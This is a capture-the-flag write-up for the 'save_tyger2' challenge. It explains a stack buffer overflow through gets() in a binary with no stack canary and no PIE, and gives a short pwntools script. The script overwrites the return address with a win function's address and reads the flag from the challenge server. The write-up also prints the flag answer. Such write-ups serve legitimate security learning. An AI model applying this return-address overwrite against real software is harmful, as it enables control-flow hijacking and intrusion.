# save_tyger2
> Tyger needs your help again.
> Connect with nc litctf.live 31788
>
> Downloads
> [save_tyger2.zip](https://drive.google.com/uc?export=download&id=1qCSTo01YjzrncT0SZGOTouC4egY_q-PX)

## Identifying the vulnerability
A call to `gets` which reads data into a stack-allocated array occurs in the `main` function. This can be used to overwrite the return address of `main` to call the `cell` function which prints the flag. Using `checksec` (a tool included with pwnlib) we can find out that `save_tyger2` is not a position independent executable (PIE) which means that the address of `cell` will always be the same:
```sh
$ checksec save_tyger2
[*] '/tmp/save_tyger2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Crafting the payload
Initially there are 2 quad-words (consisting of 8 bytes each) on the stack: the return address and the old base address (value of rbp register). The size of `buf` which we'll be overflowing is 32 bytes. This, with the return address and the base address, gives a total of 48 bytes, which is divisible by 16 - and since the stack on x64 Linux is 16 bytes aligned the actual difference between `buf` and old base address will indeed be 32 bytes (which can be confirmed by disassembling the `main` function). Therefore the length of the padding before the address of `cell` that will overwrite `main`'s return address is 40 bytes (32 to fill `buf` and 8 to overwrite the old base address). The following Python script exploits the vulnerability and reads the flag from the remote challenge:
```py
from pwn import *

e = ELF('./save_tyger2')
addr = e.symbols['cell'] # the address of `cell` function

p = remote('litctf.live', 31788)

p.recvuntil(b':sadness:\n')
p.sendline(b'A' * 40 + p64(addr))
print(p.recvall())
```

## Flag
`LITCTF{w3_w0nt_l3t_th3m_t4k3_tyg3r_3v3r_4gain}`
